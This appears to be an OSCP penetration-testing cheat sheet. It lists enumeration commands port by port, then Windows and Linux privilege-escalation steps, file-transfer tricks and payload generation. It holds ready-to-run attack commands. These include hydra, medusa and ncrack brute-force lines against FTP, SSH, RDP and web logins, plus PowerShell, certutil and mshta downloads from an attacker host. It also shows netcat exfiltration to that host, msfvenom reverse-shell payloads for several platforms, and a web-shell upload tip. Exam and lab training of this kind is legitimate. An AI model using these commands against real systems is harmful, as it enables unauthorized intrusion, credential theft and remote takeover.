# OSCP
# Active_Information_Gathering
Make a scan over all ports.<br/>
example:
`nmap -p- <IP1> <IP2> -o /root/Desktop/all_ports.txt`
## autorecon.sh
example usage:
`autorecon --profile quick <IP1> <IP2> --output /root/Desktop -vv`
# Enumeration
## FTP (21/tcp)
* anonymous login: `ftp <IP> 21` (anonymous anonymous)
* FTP vulnerable itself? searchsploit it.
* Bruteforce login (done by autorecon.sh with hydra and medusa)
  * manual examples:<br/>
`hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/root/Desktop/tcp_21_ftp_hydra.txt" ftp://<IP>`<br/><br/>
`medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/root/Desktop/tcp_21_ftp_medusa.txt" -M ftp -h <IP>`<br/>
* Download content: `wget -m ftp://anonymous:anonymous@<IP>` <br/>
* If uploading content is not working set ftp-upload to binary `binary` <br/>

## SSH (22/tcp)
* old version of ssh
* public-key with weak crypto
* Bruteforce login (done by autorecon.sh with hydra and medusa)
  * manual examples:<br/>
`hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/root/Desktop/tcp_22_ssh_hydra.txt" ssh://<IP>`<br/><br/>
`medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/root/Desktop/tcp_22_ssh_medusa.txt" -M ssh -h <IP>`
* Login with known username: `ssh username@<IP>`<br/>
* Is there content? Look for ftp-access. <br/>
* Error similar "...no matching key exchange method found...": add the following lines to /etc/ssh/ssh_config  <br/>
KexAlgorithms diffie-hellman-group1-sha1,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1

## SMTP (25/tcp)
* Enumartion of usernames
```
nc <IP> 25
[...]
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table 
```
## DNS (53/tcp)
* Extract information
* Zone transer (if Domain name is known)
```
dig axfr @<IP> DOMAIN.COM<br/>
dnsrecon -d DOMAIN.COM
```
## TFTP (69/udp)
* Gather information
`nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt <host>`
* Connect to tftp
`tftp <host>`

## POP3 (110/tcp)
Brute force:<br/>
`hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V`<br/>
`hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V`<br/>

Read mail:

`telnet <IP> 110`<br/>
`USER <USER>`<br/>
`PASS <PASSWORD>`<br/>
`LIST`<br/>
`RETR <MAIL_NUMBER>`<br/>
`QUIT`<br/>

## RPC / NFS (111/tcp)
* Enumerate (done by autorecon.sh with nmap, rpcclient)
  * manual example:<br/>
  `nmap -vv --reason -Pn -sV -p 111 --script=banner,msrpc-enum,rpc-grind,rpcinfo -oN /root/Desktop/tcp_111_rpc_nmap.txt <IP>`<br/><br/>
  `rpcclient -p 111 -U "" <IP>`
## MSRPC (135/tcp, 593/tcp)  
* Enumerate (done by autorecon.sh with nmap, rpcclient)
  * manual example:<br/>
  `nmap -vv --reason -Pn -sV -p 135 --script=banner,msrpc-enum,rpc-grind,rpcinfo -oN /root/Desktop/tcp_111_rpc_nmap.txt <IP>`<br/><br/>
  `rpcclient -p 111 -U "" <IP>`
## SMB (139/tcp and 445/tcp)
* null session to connect to a windows share: `smbclient -U '%' -N \\\\<IP>\\<SHARE>` 
* authenticated session to connect to a windows share `smbclient -U '<USER>' \\\\<IP>\\<SHARE>`
* anonymous login: `smbclient -N -L \\\\<IP>`
* List out files (if anonymous login is enabled): `smbmap -H <IP> -R`<br/>
* Connect to share (if accessible): `smbclient //<IP>/sharename$`<br/>
* Download all folders recursivly:<br/>
`mask ""`<br/>
`recurse ON`<br/>
`prompt OFF`<br/>
`lcd /root/Desktop/smb/`<br/>
`mget *`<br/>
* Find samba version:<br/>
Open Terminal1 `ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139`<br/>
Open Terminal2 ``echo exit | smbclient -L IP-ADDRESS``<br/>
* Enumerate (done by autorecon.sh with nmap and enum4linux)
  * manual example:<br/>
 `nmap -vv --reason -Pn -sV -p 139 --script="smb-vuln-ms06-025" --script-args="unsafe=1" -oN "/root/Desktop/scans/tcp_139_smb_ms06-025.txt" <IP>`<br/><br/>
 `nmap -vv --reason -Pn -sV -p 139 --script="smb-vuln-ms07-029" --script-args="unsafe=1" -oN "/root/Desktop/tcp_139_smb_ms07-029.txt" <IP>`<br/><br/>
 `nmap -vv --reason -Pn -sV -p 139 --script="smb-vuln-ms08-067" --script-args="unsafe=1" -oN "/root/Desktop/tcp_139_smb_ms08-067.txt" <IP>`<br/><br/>
 `enum4linux -a <IP>`
## SNMP (161/udp)
`snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
`snmp-check <IP>`<br/>

## ldap (389/tcp,636/tcp,3268/tcp,3296/tcp)
* Enumerate (done by autorecon.sh with nmap and ldapsearch)
  * manual example:<br/>
 `nmap -vv --reason -Pn -sV -p 389 "--script=banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /root/Desktop/tcp_389_ldap_nmap.txt <IP>`<br/><br/>
 `ldapsearch -x -D "<username>" -w "<password>" -p 389 -h <IP> -b "dc=example,dc=com" -s sub "(objectclass=*) 2>&1 | tee > "/root/Desktop/scans/tcp_389_ldap_all-entries.txt"`
 
 ## ms-sql (1433/tcp)
* Enumerate (done by autorecon.sh with nmap and sqsh)
  * manual example:<br/>
 `nmap -vv --reason -Pn -sV -p 1433 "--script=banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args=mssql.instance-port=1433,mssql.username=sa,mssql.password=sa -oN /root/Desktop/tcp_1433_mssql_nmap.txt <IP>`<br/><br/>
 `sqsh -U <username> -P <password> -S <IP>:1433`<br/><br/>
Brute force:<br/>
`hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u`
## RDP (3389/tcp)
* Guest login: `rdesktop -u guest -p guest <IP>`
* Brute force: `ncrack -vv --user Administrator -P /path_to_password_list rdp://<IP>`
 
## HTTP(S) (80/tcp, 443/tcp, 8000/tcp, 8080/tcp, 8443/tcp, …)
* close enumeration (done by autorecon.sh with nikto, feroxbuster, dirsearch, dirb, gobuster, wpscan, hydra, medusa)
  * manual examples:<br/>
 `nikto -ask=no -h http://<IP>:8080 2>&1 | tee "/root/Desktop/tcp_8080_http_nikto.txt"`<br/><br/>
 `feroxbuster -u http://<IP>:8080 -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -o /root/Desktop/tcp_8080_http_feroxbuster_big.txt`<br/><br/>
 `dirsearch -u http://<IP>:8080/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt -o /root/Desktop/tcp_8080_http_dirsearch_big.txt`<br/><br/>
 `dirb http://<IP>:8080/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "/root/Desktop/tcp_8080_http_dirb_big.txt"`<br/><br/>
 `gobuster dir -u http://<IP>:8080/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/root/Desktop/tcp_8080_http_gobuster_big.txt"`<br/><br/>
 `wpscan --url http://<IP>:8080/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/root/Desktop/tcp_8080_http_wpscan.txt"`<br/><br/>
 `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/root/Desktop/tcp_8080_http_auth_hydra.txt" http-get://<IP>/path/to/auth/area` <br/><br/>
 `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/root/Desktop/scans/tcp_8080_http_form_hydra.txt" http-post-form://<IP>/path/to/login.php:username=^USER^&password=^PASS^:invalid-login-message`<br/><br/>
  `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 8080 -O "/root/Desktop/tcp_8080_http_auth_medusa.txt" -M http -h <IP> -m DIR:/path/to/auth/area`<br/><br/>
  `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 8080 -O "/root/Desktop/tcp_8080_http_form_medusa.txt" -M web-form -h <IP> -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"`
* high degree of manual inspection
  * Check for error pages  
  * Try some easy logins
  * Search web for standard logins
  * Try or directory traversal
* SSLScan<br/>
example usage: `sslscan <IP>`
* Burpsuite<br/>
  * Basic Authentication<br/>
  1. Intercept Request<br/>
  2. Send Request to Intruder<br/>
  3. Payload Positions -> Add two positions<br/>
  4. Payloads -> Payload type: Custom iterator ¦ Separator for position 1: ':' ¦ Payload Processing: Base64-encode ¦ Payload Encoding: Delete '='
### Initial shell php
p0wny-shell: try to upload p0wny-shell, try to detect, where it was uploaded.
github.com/flozz/p0wny-shell
# Privilege_Escalation_Windows
## Manual enumeration:
`whoami`<br/>
`net user <username>`<br/>
`tasklist`<br/>
`netstat -a`<br/>
`systeminfo`<br/>
`net config Workstation`<br/> 
`net users`<br/>
Has a Windows Auto-login Password been set?<br/> 
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`<br/> 
Tree of all the folders / files on the HDD<br/> 
`tree c:\`<br/> 
or for a list of files:<br/>
`dir /s c:\`<br/>

## Automated enumeration:
### WindownPrivEsc.exe
`windows-privesc-check.exe --audit -a -o report`<br/>
### Sherlock
### Winpeas.bat (has Watson integrated)
Just upload and run from a cmd. <br/>
### JAWZ
### Seatbelt
## Escalation
### JuicyPotato.exe
Check if "SeImpersonatePrivilege" is enabled: `whoami /priv`<br/>



# Privilege_Escalation_Linux
## Manual enumeration:
Look for commands, that can be run without  password:`sudo -l` <br/>
Get user context information:`id` <br/>
Enumerate users: `cat /etc/passwd`<br/>
Enumerate hostname: `hostname`<br/>
OS Information: `cat /etc/issue`<br/>
Kernel Information: `uname -r`, `uname -a`<br/>
Return Linux processes: `ps -aux`<br/>
Network routing tables: `route print`<br/>
Show configuration of network adapters: `ip a`<br/>
Show network routing tables: `/sbin/route`<br/>
Display active network connections: `ss`<br/>
View scheduled tasks: `ls -lah /etc/cron*`<br/>
View created tasks: `cat /etc/crontab`<br/>
List installed applications: `dpkg -l`<br/>
Drive informations: `cat /etc/fstab`, `mount`, `lsblk`  <br/>
show loaded kernel modules: `lsmod`<br/>
## Automated enumeration:
* linpeas.sh from https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh<br/>
## File transfer, upload to target:
Start web server in the current directory on port 80:<br/>
`python3 -m http.server 80`<br/>
Upload from victim:<br/>
### Powershell
`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.xxx.xxx:80/some_file', 'c:\Users\Public\Downloads\some_file')"`<br/>
### wget
`wget 192.168.xxx.xxx:80/some_file`<br/>
### CertUtil.exe
`certutil.exe -split -f 192.168.xxx.xxx:80/some_file`<br/>
### mshta 
over http:<br/>
`mshta http://192.168.xxx.xxx/some_file`<br/>
over ftp:<br/>
`mshta ftp://192.168.xxx.xxx/some_file`<br/>
## File transfer, download to attacker:
Upload nc.exe to target<br/>
Command on attacker: `nc -lvp 443 > report.html`<br/>
Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
## compile code:
Exploit mostly written in c.<br/>
`gcc -o exploit EXPLOIT.c `<br/>
# Compile C code, add –m32 after ‘gcc’ for compiling 32 bit code on 64 bit Linux<br/>
`i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe`

# Cross compiling
Compile Windows exploit in Linux<br/>
`i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe`

## create payload:
`shellrator.py `<br/>

windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe` <br/>
cmd: `msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe` <br/>
linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf` <br/>
php: `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php` <br/>
python: `msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py` <br/>
bash: `msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh` <br/>



# Solutions
## Port in used (Python server) 
Message "Address is already in use": `lsof -i:80` kill corresponding app.<br/>
## Testing-string for sql-injection 
`'">*)asdf-${{<%[%'"}}%\` <br/>
## Problems python2 python3 
Install pyenv: https://github.com/pyenv/pyenv <br/>
Example usage:<br/>
* Install python 2.7.18
  `pyenv install 2.7.18`
* open python 2.7.18 shell
  `pyenv shell 2.7.18`
*  Install software
   `pip install pycrypto`
   `pip install impacket`
*   run Exploit
    `python /root/Desktop/ms08_067_2018.py <IP> XP 445`


## Commands from terminal not working 
error messae "-rbash: cd: restricted" or similar<br/>
Fix PATH:<br/>
`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:`<br/>
Try spawn shell: `python -c 'import pty; pty.spawn("/bin/bash")'` <br/>
Fix PATH again (because its a new shell):<br/>
`export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"`<br/>
`/games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>






